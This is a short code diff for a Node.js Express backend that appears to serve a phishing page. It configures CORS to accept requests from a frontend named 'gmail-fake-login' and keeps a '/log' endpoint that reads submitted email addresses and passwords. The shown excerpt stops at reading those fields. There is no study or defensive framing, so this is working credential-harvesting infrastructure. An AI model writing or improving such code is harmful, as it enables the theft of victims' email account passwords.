@@ -1,17 +1,15 @@
 const express = require('express');
 const fs = require('fs');
+const cors = require('cors'); // Add this line
 const app = express();
 
-// Allow CORS (so the frontend can talk to the backend)
-app.use(function(req, res, next) {
-    res.header("Access-Control-Allow-Origin", "*");
-    res.header("Access-Control-Allow-Headers", "Content-Type");
-    next();
-});
+// Allow requests from your frontend
+app.use(cors({
+    origin: 'https://gmail-fake-login.onrender.com' // Your frontend URL
+}));
 
 app.use(express.json());
 
-// Handle the POST request from the frontend
 app.post('/log', function(req, res) {
     const email = req.body.email;
     const password = req.body.password;
